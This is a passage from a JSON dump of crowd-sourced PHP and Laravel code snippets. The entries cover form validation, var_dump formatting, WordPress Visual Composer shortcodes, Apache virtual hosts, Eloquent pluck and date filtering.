    "description": "preg_match(\"/^([a-zA-Z' ]+)$/\",\"Given_Name\");\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5048,
    "keyword": null,
    "link": null,
    "title": " validate password laravel",
    "description": "'password' => 'required|                min:6|                regex:/^.*(?=.{3,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\\d\\x])(?=.*[!$#%]).*$/|                confirmed', \nuse Illuminate\\Validation\\Rules\\Password;   $request->validate([     'password' => [         'required',         'confirmed',         Password::min(8)             ->mixedCase()             ->letters()             ->numbers()             ->symbols()             ->uncompromised(),     ], ]);\n        $request->validate([             'email' =>'required|exists:users',             'password'=>'required|password'         ]);\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5049,
    "keyword": null,
    "link": null,
    "title": " validate time in laravel",
    "description": " $request->validate([         'start_date' => 'date_format:d/m/Y',         'end_date' => 'date_format:d/m/Y'     ]);\npublic function store(Illuminate\\Http\\Request $request) {     $this->validate($request, [         'time_start' => 'date_format:H:i',         'time_end' => 'date_format:H:i|after:time_start',     ]);      // do other stuff }\n 'day'            =>  'required|date',\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5050,
    "keyword": null,
    "link": null,
    "title": " validation error message in laravel",
    "description": "$errors = $validator->errors()->getMessages();\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n/**  * Store a new blog post.  *  * @param  Request  $request  * @return Response  */  public function store(Request $request) {     $validatedData = $request->validate([         'title' => 'required|unique:posts|max:255',         'body' => 'required',     ]);      // The blog post is valid... }\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif \n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages); \n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5051,
    "keyword": null,
    "link": null,
    "title": " validation not exists with this id laravel",
    "description": "$e = Subscription::find($request->subscription_id); $rules = [   'subscription_id' => 'required|integer|exists:subscriptions,id',   'date' => 'required|date|after:yesterday',   'date' => Rule::unique('member_attendances')->where(function ($query) use ($e) {               return $query->where('member_id', $e->member_id); }) //|unique:member_attendances,date,'.$e->member_id . ',member_id', ];\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5052,
    "keyword": null,
    "link": null,
    "title": " validator laravel",
    "description": "'item' => 'required|integer|between:1,10',\n'email' => 'required|email|unique:users,email', //@sujay\npublic function store(Request $request) {     $validator = Validator::make($request->all(), [         'title' => 'bail|required|max:255',         'body' => 'required',     ]);      // Check validation failure     if ($validator->fails()) {        // [...]              foreach($validator->messages()->getMessages() as $field_name => $messages) {                  // Go through each message for this field.                 foreach($messages AS $message) {                     echo '***********'.$message.'***********<br>';                 }             }     }      // Check validation success     if ($validator->passes()) {        // [...]     }      // Retrieve errors message bag     $errors = $validator->errors(); }\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \n$validatedData = $request->validate([     'title' => ['required', 'unique:posts', 'max:255'],     'body' => ['required'], ]);\nif (request('event') == null) {     $validator->errors()->add('event', 'Please select an event'); }\n",
    "reg_date": "2021-10-12T10:20:52.000Z"
  },
  {
    "id": 5053,
    "keyword": null,
    "link": null,
    "title": " valide email php",
    "description": "<?php    $email = \"pattrick@tutorialspoint.com\";    // Validate email    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {       echo(\"$email is a valid email address\");    }    else{       echo(\"$email is not a valid email address\");    } ?>\n$email = \"email@email.fr\";  if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {   $emailErr = \"Email invalide\"; }\n// E-mail Code Validation using a four digit number:  // var.inc.php:  <?php  session_start(); $x = mt_rand(1000,9999); // index.php:  <?php  include_once 'var.inc.php'; $_SESSION['key'] = $x; if(isset($_POST['submit'])){     if(!mail($_POST['email-in'], \"Verify\", \"Code: \". $x)){         echo \"ERROR EMAIL\";     }else{         header(\"Location: validate.php\");     } } ?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate email</title> </head>  <body>     <form action=\"\" method=\"post\">         <input type=\"email\" placeholder=\"email\" name=\"email-in\">         <button id=\"submit\" type=\"submit\" name=\"submit\">Submit</button>     </form> </body> </html> // validate.php:    <?php session_start();?> <!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Validate</title> </head> <body>     <form action=\"\" method=\"post\">         <input type=\"number\" name=\"user-key\">         <button type=\"submit\" name=\"submit-user-key\">Validate</button>     </form> </body> </html> <?php      if(isset($_POST['submit-user-key'])){         if($_POST['user-key'] == $_SESSION['key']){             //Do something         }     } ?>\n$pattern = '/^(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){255,})(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){65,}@)(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22))(?:\\\\.(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\\\]))$/iD';  $emailaddress = 'test@gmail.com';  if (preg_match($pattern, $emailaddress) === 1) {     // emailaddress is valid } \n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5054,
    "keyword": null,
    "link": null,
    "title": " var dump  post php",
    "description": "<?php print_r($_POST); ?>\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5055,
    "keyword": null,
    "link": null,
    "title": " var dump beautifier",
    "description": "echo '<pre>' . var_export($data, true) . '</pre>';\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5056,
    "keyword": null,
    "link": null,
    "title": " var dump not showing all",
    "description": "ini_set('xdebug.var_display_max_depth', -1); ini_set('xdebug.var_display_max_children', -1); ini_set('xdebug.var_display_max_data', -1);\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5057,
    "keyword": null,
    "link": null,
    "title": " var dump php look clear",
    "description": "// make php var_dump print_r var_export look clear and pretty echo '<pre>' . var_export($data, true) . '</pre>'; die('<pre>' . var_export($data, true) . '</pre>');\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5058,
    "keyword": null,
    "link": null,
    "title": " var dump pretty",
    "description": "$licks = ['one', 'two', 'three'];  echo '<pre>'; print_r($licks); echo '</pre>';  /* array(3) {   [0]=>   string(3) \"one\"   [1]=>   string(3) \"two\"   [2]=>   string(5) \"three\" } */\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5059,
    "keyword": null,
    "link": null,
    "title": " var dump smarty",
    "description": "{$var|@var_dump}\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5060,
    "keyword": null,
    "link": null,
    "title": " vc map type number",
    "description": "<?php // [bartag foo=\"foo-value\"] add_shortcode( 'bartag', 'bartag_func' ); function bartag_func( $atts ) {  extract( shortcode_atts( array(   'foo' => 'something'  ), $atts ) );     return \"foo = {$foo}\"; } ?>\n<?php add_action( 'vc_before_init', 'your_name_integrateWithVC' ); function your_name_integrateWithVC() {  vc_map( array(   \"name\" => __( \"Bar tag test\", \"my-text-domain\" ),   \"base\" => \"bartag\",   \"class\" => \"\",   \"category\" => __( \"Content\", \"my-text-domain\"),   'admin_enqueue_js' => array(get_template_directory_uri().'/vc_extend/bartag.js'),   'admin_enqueue_css' => array(get_template_directory_uri().'/vc_extend/bartag.css'),   \"params\" => array(  array(   \"type\" => \"textfield\",   \"holder\" => \"div\",   \"class\" => \"\",   \"heading\" => __( \"Text\", \"my-text-domain\" ),   \"param_name\" => \"foo\",   \"value\" => __( \"Default param value\", \"my-text-domain\" ),   \"description\" => __( \"Description for foo param.\", \"my-text-domain\" )  ),  array(   \"type\" => \"colorpicker\",   \"class\" => \"\",   \"heading\" => __( \"Text color\", \"my-text-domain\" ),   \"param_name\" => \"color\",   \"value\" => '#FF0000', //Default Red color   \"description\" => __( \"Choose text color\", \"my-text-domain\" )  )   )  ) ); } \n<?php add_shortcode( 'bartag', 'bartag_func' ); function bartag_func( $atts ) {  extract( shortcode_atts( array(   'foo' => 'something',   'color' => '#FFF'  ), $atts ) );     return \"<div style='color:{$color};'>foo = {$foo}</div>\"; } ?>\n<?php add_action( 'vc_before_init', 'your_name_integrateWithVC' ); function your_name_integrateWithVC() {  vc_map( array(   \"name\" => __( \"Bar tag test\", \"my-text-domain\" ),   \"base\" => \"bartag\",   \"class\" => \"\",   \"category\" => __( \"Content\", \"my-text-domain\"),   'admin_enqueue_js' => array(get_template_directory_uri().'/vc_extend/bartag.js'),   'admin_enqueue_css' => array(get_template_directory_uri().'/vc_extend/bartag.css'),   \"params\" => array(  array(   \"type\" => \"textfield\",   \"holder\" => \"div\",   \"class\" => \"\",   \"heading\" => __( \"Text\", \"my-text-domain\" ),   \"param_name\" => \"foo\",   \"value\" => __( \"Default param value\", \"my-text-domain\" ),   \"description\" => __( \"Description for foo param.\", \"my-text-domain\" )  ),  array(   \"type\" => \"colorpicker\",   \"class\" => \"\",   \"heading\" => __( \"Text color\", \"my-text-domain\" ),   \"param_name\" => \"color\",   \"value\" => '#FF0000', //Default Red color   \"description\" => __( \"Choose text color\", \"my-text-domain\" )  ),  array(   \"type\" => \"textarea_html\",   \"holder\" => \"div\",   \"class\" => \"\",   \"heading\" => __( \"Content\", \"my-text-domain\" ),   \"param_name\" => \"content\", // Important: Only one textarea_html param per content element allowed and it should have \"content\" as a \"param_name\"   \"value\" => __( \"<p>I am test text block. Click edit button to change this text.</p>\", \"my-text-domain\" ),   \"description\" => __( \"Enter your content.\", \"my-text-domain\" )  )   )  ) ); } ?>\n<?php add_action( 'vc_before_init', 'your_name_integrateWithVC' ); function your_name_integrateWithVC() {  vc_map( array(   \"name\" => __( \"Bar tag test\", \"my-text-domain\" ),   \"base\" => \"bartag\",   \"class\" => \"\",   \"category\" => __( \"Content\", \"my-text-domain\"),   'admin_enqueue_js' => array(get_template_directory_uri().'/vc_extend/bartag.js'),   'admin_enqueue_css' => array(get_template_directory_uri().'/vc_extend/bartag.css'),   \"params\" => array(  array(   \"type\" => \"textfield\",   \"holder\" => \"div\",   \"class\" => \"\",   \"heading\" => __( \"Text\", \"my-text-domain\" ),   \"param_name\" => \"foo\",   \"value\" => __( \"Default param value\", \"my-text-domain\" ),   \"description\" => __( \"Description for foo param.\", \"my-text-domain\" )  )   )  ) ); } \n<?php add_shortcode( 'bartag', 'bartag_func' ); function bartag_func( $atts, $content = null ) { // New function parameter $content is added!  extract( shortcode_atts( array(   'foo' => 'something',   'color' => '#FFF'  ), $atts ) );     $content = wpb_js_remove_wpautop($content, true); // fix unclosed/unwanted paragraph tags in $content     return \"<div style='color:{$color};' data-foo='${foo}'>{$content}</div>\"; } ?>\narray(   \"type\" => \"textfield\",   \"holder\" => \"div\",   \"class\" => \"\",   \"heading\" => __( \"Text\", \"my-text-domain\" ),   \"param_name\" => \"foo\",   \"value\" => __( \"This is test param for creating new project\", \"my-text-domain\" ),   \"description\" => __( \"Enter foo.\", \"my-text-domain\" ) \n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5061,
    "keyword": null,
    "link": null,
    "title": " verificare esistenza file in php",
    "description": "if( file_exists(\"percorso-completo/file-o-immagine.jpg\")) {   //the existing file    }else{ //the file does not exist }\n",
    "reg_date": "2021-10-12T10:20:53.000Z"
  },
  {
    "id": 5062,
    "keyword": null,
    "link": null,
    "title": " view-source.https//moodle.alaqsa.edu.ps/mod/quiz/review.php",
    "description": "view-source.https//moodle.alaqsa.edu.ps/mod/quiz/review.php\nview-sourse:https://moodle.alaqsa.edu.ps/mod/quiz/review.php\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5063,
    "keyword": null,
    "link": null,
    "title": " virtual fields cakphp",
    "description": " // ------------------- CONCAT USE virtualFields $this->virtualFields['myField'] = \"CONCAT(language.name, ' (', language.description,  ')' )\";\t// using this for use concat \t\t return $this->find('list', array(     'fields' => array(         'ImageType.id',          'myField',     ),     'conditions' => array(         'ImageType.slug LIKE' => $slug,     ),     'joins' => array(         array(             'table' => Environment::read('table_prefix') . 'image_type_languages',              'alias' => 'language',             'type' => 'INNER',             'conditions'=> array(                 'ImageType.id = language.image_type_id',                 'language.alias = \\'' . $language . '\\'',             )         ),     ), ));\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5064,
    "keyword": null,
    "link": null,
    "title": " virtual host laravel",
    "description": "<VirtualHost *:80>     ServerName   your-domain.com     DocumentRoot \"/var/www/html/your-domain.com/public/\"     ErrorLog     \"/var/www/html/your-domain.com/error.log\"     CustomLog    \"/var/www/html/your-domain.com/access.log\" combined      <Directory \"/var/www/html/your-domain.com/public\">         Options +Indexes +FollowSymLinks         DirectoryIndex index.php         AllowOverride None         Require all granted          <IfModule mod_rewrite.c>             <IfModule mod_negotiation.c>                 Options -MultiViews             </IfModule>              RewriteEngine On              # Handle Front Controller...             RewriteCond %{REQUEST_FILENAME} !-d             RewriteCond %{REQUEST_FILENAME} !-f             RewriteRule ^ index.php [L]              # Handle Authorization Header             RewriteCond %{HTTP:Authorization} .             RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]         </IfModule>     </Directory>  </virtualhost> \n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5065,
    "keyword": null,
    "link": null,
    "title": " vs code extension on php cli",
    "description": "{   \"php.validate.executablePath\": \"c:/php/php.exe\" }\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5066,
    "keyword": null,
    "link": null,
    "title": " vue mouseover",
    "description": "<template>   <div     @mouseover=\"hover = true\"     @mouseleave=\"hover = false\"   /> </template>\n<style> \t\t.pink {             background-color: pink;         }         .branco {             background-color: white;         } </style> <body>  \t<div id=\"app\">     \t<div              class=\"borda div-comum\"              @mouseover=\"mudarCor('pink')\"              @mouseleave=\"mudarCor('branco')\">         </div>    \t</div>          <script>          options = {             el: '#app',             data: {                 cor: ''             },             methods: {                 mudarCor(c) {                     this.cor = c;                     console.log(c);                     console.log('Cor : ' , this.cor);                 }             },         }         const vm = new Vue(options);         console.log(vm);      </script>      </body>\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5067,
    "keyword": null,
    "link": null,
    "title": " warning illegal string offset",
    "description": "// try to var_dump($the_problem);  /* if you can work it out.  take a break,  I think you are very sleepy.*/\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5068,
    "keyword": null,
    "link": null,
    "title": " web api return json example in php",
    "description": "$option = $_GET['option'];  if ( $option == 1 ) {     $data = [ 'a', 'b', 'c' ];     // will encode to JSON array: [\"a\",\"b\",\"c\"]     // accessed as example in JavaScript like: result[1] (returns \"b\") } else {     $data = [ 'name' => 'God', 'age' => -1 ];     // will encode to JSON object: {\"name\":\"God\",\"age\":-1}       // accessed as example in JavaScript like: result.name or result['name'] (returns \"God\") }  header('Content-type: application/json'); echo json_encode( $data ); \n        $upgradeFlutterButton = new FlutterButton(\"UPGRADE\", \"2\", \"com.COMPANY.APP_NAME\");          $postData = array(             'app_id' => 1,             'actions' => [               $upgradeFlutterButton             ],             'user_id' => 2,         );          $objectRequest = new \\Illuminate\\Http\\Request();         $objectRequest->setMethod('POST');         $objectRequest->request->add($postData);          return $objectRequest;\n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5069,
    "keyword": null,
    "link": null,
    "title": " web scraping php",
    "description": " <?php  $html = file_get_contents('https://devcode.la/'); //Convierte la informaci&oacute;n de la URL en cadena echo $html; ?>  \n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5070,
    "keyword": null,
    "link": null,
    "title": " webpack font awesome",
    "description": "// implementing font awesome 5 (fa5) in symfony 4+ applications using webpack // firstly install fontawesome. Run `yarn add @fortawesome/fontawesome-free` on your terminal. //Then you simply require all.css and all.js in your app.js file. // Incase it's not clear which app.js file I'm referring to here, // you can find the app.js file in the app-root/assets/js directory. import '@fortawesome/fontawesome-free/js/all.js'; import '@fortawesome/fontawesome-free/css/all.css'; \n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5071,
    "keyword": null,
    "link": null,
    "title": " webstorm",
    "description": "Very smart choice, pal. Very smart.\nJetbrain's IDEs are the best in the World.                                         - Hiren Vadher\nDevelopement Company of IDE's like Pycharm \n",
    "reg_date": "2021-10-12T10:20:54.000Z"
  },
  {
    "id": 5072,
    "keyword": null,
    "link": null,
    "title": " week starting date and end date in php",
    "description": "date('w'); //gets day of week as number(0=sunday,1=monday...,6=sat)  //note:returns 0 through 6 but as string so to check if monday do this: if(date('w') == 1){ \techo \"its monday baby\"; }\n<?php \t$week=29; \t$year=2017; \t   function getStartAndEndDate($week, $year)   {       $dateTime = new DateTime();       $dateTime->setISODate($year, $week);      $result['start_date'] = $dateTime->format('d-M-Y');     $dateTime->modify('+6 days');      $result['end_date'] = $dateTime->format('d-M-Y');      return $result;   }    $dates=getStartAndEndDate($week,$year); \tprint_r($dates);  ?>\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5073,
    "keyword": null,
    "link": null,
    "title": " what does $ sign mean in php",
    "description": "<?php  $name = \"World\"; echo \"Hello, $name\";  # $ i.e. \"sigil\" is used to distinguish a string variable from rest of the string.\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5074,
    "keyword": null,
    "link": null,
    "title": " what does $request do in php",
    "description": "$message = \"\";  if($_REQUEST['msg'] == \"new\"){     $message = \"New User has been added successfully\"; }else if($_REQUEST['msg'] == 'edit'){     $message = \"User has been saved successfully\"; }else if($_REQUEST['msg'] == 'update'){     $message = \"User(s) has been Updated successfully\"; }\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5075,
    "keyword": null,
    "link": null,
    "title": " what does defined di in php",
    "description": "//The defined() function checks wheather a consant exists <?php   define(\"Greet\",\"Hello World\");   echo defined(\"Greet\");   ?>\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5076,
    "keyword": null,
    "link": null,
    "title": " what does defined do in php",
    "description": "//The defined() function checks wheather a consant exists <?php   define(\"Greet\",\"Hello World\");   echo defined(\"Greet\");   ?>\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5077,
    "keyword": null,
    "link": null,
    "title": " what is app env in laravel",
    "description": "Laravel 5 uses .env file to configure your app. .env should not be committed on your repository, like github or bitbucket. On your local environment your .env will look like the following:  # .env APP_ENV=local For your production server, you might have the following config:  # .env APP_ENV=production\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5078,
    "keyword": null,
    "link": null,
    "title": " what is directory separator in php",
    "description": "Because in different OS there is different directory separator. In Windows it's \\ in Linux it's /. DIRECTORY_SEPARATOR is constant with that OS directory separator. Use it every time in paths.  In you code snippet we clearly see bad practice code. If framework/cms are widely used it doesn't mean that it's using best practice code.\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5079,
    "keyword": null,
    "link": null,
    "title": " what is my ip php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$_SERVER['REMOTE_ADDR']\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5080,
    "keyword": null,
    "link": null,
    "title": " what is the difference between static and dynamic websites?",
    "description": "Static Websites:- in static websites, content can't be changed after running the script. you cannot change anything in the site as it is predefined. Dynamic websites:- in dynamic websites, content of script can be changed at the run time. its content is regenerated every time a user visits or reloads.\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5081,
    "keyword": null,
    "link": null,
    "title": " what is the hashmap like in php",
    "description": "class IEqualityComparer {     public function equals($x, $y) {         throw new Exception(\"Not implemented!\");     }     public function getHashCode($obj) {         throw new Exception(\"Not implemented!\");     } }  class HashMap {     private $map = array();     private $comparer;      public function __construct(IEqualityComparer $keyComparer) {         $this->comparer = $keyComparer;     }      public function has($key) {         $hash = $this->comparer->getHashCode($key);          if (!isset($this->map[$hash])) {             return false;         }          foreach ($this->map[$hash] as $item) {             if ($this->comparer->equals($item['key'], $key)) {                 return true;             }         }          return false;     }      public function get($key) {         $hash = $this->comparer->getHashCode($key);          if (!isset($this->map[$hash])) {             return false;         }          foreach ($this->map[$hash] as $item) {             if ($this->comparer->equals($item['key'], $key)) {                 return $item['value'];             }         }          return false;     }      public function del($key) {         $hash = $this->comparer->getHashCode($key);          if (!isset($this->map[$hash])) {             return false;         }          foreach ($this->map[$hash] as $index => $item) {             if ($this->comparer->equals($item['key'], $key)) {                 unset($this->map[$hash][$index]);                 if (count($this->map[$hash]) == 0)                     unset($this->map[$hash]);                  return true;             }         }          return false;     }      public function put($key, $value) {         $hash = $this->comparer->getHashCode($key);          if (!isset($this->map[$hash])) {             $this->map[$hash] = array();         }          $newItem = array('key' => $key, 'value' => $value);                  foreach ($this->map[$hash] as $index => $item) {             if ($this->comparer->equals($item['key'], $key)) {                 $this->map[$hash][$index] = $newItem;                 return;             }         }          $this->map[$hash][] = $newItem;     } }\n",
    "reg_date": "2021-10-12T10:20:55.000Z"
  },
  {
    "id": 5082,
    "keyword": null,
    "link": null,
    "title": " what php can do",
    "description": "PHP can generate dynamic page content. PHP can create, open, read, write, delete, and close files on the server. PHP can collect form data. PHP can send and receive cookies. PHP can add, delete, modify data in your database. PHP can be used to control user-access. PHP can encrypt data and apply validation. PHP used to send and receive E-Mails. PHP can be used to integrate with other third party tools. PHP can output images, PDF files, and even Flash movies. You can also output any text, such as XHTML and XML.   \nPHP stood for Personal Home Page now it stands for Hypertext Pre-processor. PHP is an open-source, interpreted, and object-oriented scripting language that can be executed at the server-side.  PHP is well suited for web development. Therefore, it is used to develop web applications (an application that executes on the server and generates the dynamic page). PHP was created by Rasmus Lerdorf in 1994 but appeared in the market in 1995.Most of PHP syntax is based on C. It is used to manage dynamic content, databases, session tracking, even build entire e-commerce sites. PHP is powerful enough to be at the core of the biggest blogging system on the web (WordPress)! PHP is deep enough to run the largest social network (Facebook)! PHP is also easy enough to be a beginner's first server side language!\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5083,
    "keyword": null,
    "link": null,
    "title": " what should write for getting extension of image in php",
    "description": "//get image extension of uploaded file in php $imagetype = $_FILES['image']['name']; $ext = pathinfo($imagetype, PATHINFO_EXTENSION);// get file extension\n $image_name = $_FILES['image']['name'];         $ext = explode('.',$image_name);\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5084,
    "keyword": null,
    "link": null,
    "title": " what sign is greater than or equal to php",
    "description": "// Greater than or equal to comparison operator:  >= if ($someInt >= $otherInt) {   // Do your logic ;) }\n// Less than or equal to comparison operator:  <= if ($someInt <= $otherInt) {   // Do your logic ;) }\nGreater than or equal to comparison operator:  >=\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5085,
    "keyword": null,
    "link": null,
    "title": " what sign is less than or equal to php",
    "description": "// Greater than or equal to comparison operator:  >= if ($someInt >= $otherInt) {   // Do your logic ;) }\n// Less than or equal to comparison operator:  <= if ($someInt <= $otherInt) {   // Do your logic ;) }\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5086,
    "keyword": null,
    "link": null,
    "title": " when image update laravel delete remove image",
    "description": "public function update(Post $post){     $this->validateRequest();     $data = [         'title' => request()->title,         'content' => request()->content     ];     if (request()->hasFile('image') && request('image') != '') {         $imagePath = public_path('storage/'.$post->image);         if(File::exists($imagePath)){             unlink($imagePath);         }         $image = request()->file('image')->store('uploads', 'public');         $data['image'] = $image;         $post->update($data);     }     $post->update($data); } \npublic function update($id) {       $article = Article::find($id);          if(Input::hasFile('image'))     {              $file = Input::file('image');              $name = time() . '-' . $file->getClientOriginalName();              $file = $file->move(public_path() . '/images/profile/', $name);              $article->file= $name;     }     $article->save();     return \"success\"; } \n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5087,
    "keyword": null,
    "link": null,
    "title": " when to use pluck method in laravel",
    "description": "$users = User::all()->pluck('field_name'); //for keys instead of [User::all()->pluck('id');] use $user_ids = User::all()->modelKeys();\n// QUESTION When We should use Pluck method in laravel???  // ANSWER You might often run into a situation where you have to  extract certain values (excluding the keys) from a collection  then you should use pluck(). i.e (when you only need value, not the key)    //Example 1 let we have a list of results and we only need the value of one colum  $attendees = collect([     ['name' => 'Bradmen', 'email' => 'bradmen@gmail.com', 'city' => 'London'],     ['name' => 'Jhon Doe', 'email' => 'doe@gmail.com', 'city' => 'paris'],     ['name' => 'Martin', 'email' => 'martin@gmail.com', 'city' => 'washington'], ]);  $names = $attendees->pluck('name') //Reult ['Bradmen', 'Jhon Doe', 'Martin'];  //Example 2 OR You can use like this    $users = User::all(); $usernames = $users->pluck('username'); \n$name = DB::table('users')->where('name', 'John')->pluck('name');\n$users = Users::pluck('name','email'); dd($users);\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5088,
    "keyword": null,
    "link": null,
    "title": " when will betelgeuse explode",
    "description": "//I WILL LIVE FOREVER\n//not likely in your life time\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5089,
    "keyword": null,
    "link": null,
    "title": " where('created at', '=', date('Y-m-d'));",
    "description": "$q->whereDay('created_at', '=', date('d')); $q->whereMonth('created_at', '=', date('m')); $q->whereYear('created_at', '=', date('Y'));\n$q->whereDate('created_at', '=', date('Y-m-d'));\n$q->where('created_at', '>=', date('Y-m-d').' 00:00:00'));\n$q->where(DB::raw(\"DATE(created_at) = '\".date('Y-m-d').\"'\"));\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5090,
    "keyword": null,
    "link": null,
    "title": " whereHas site:https://laravel.com/docs/",
